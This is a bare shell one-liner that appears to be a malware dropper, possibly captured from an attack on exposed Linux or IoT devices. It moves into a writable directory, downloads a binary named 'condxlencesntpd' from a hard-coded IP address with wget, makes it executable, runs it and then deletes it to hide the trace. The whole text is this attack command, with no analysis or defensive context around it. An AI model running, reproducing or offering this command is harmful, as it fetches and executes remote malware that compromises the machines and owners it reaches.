cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.236.85.11/condxlencesntpd; chmod +x condxlencesntpd; ./condxlencesntpd; rm -rf condxlencesntpd
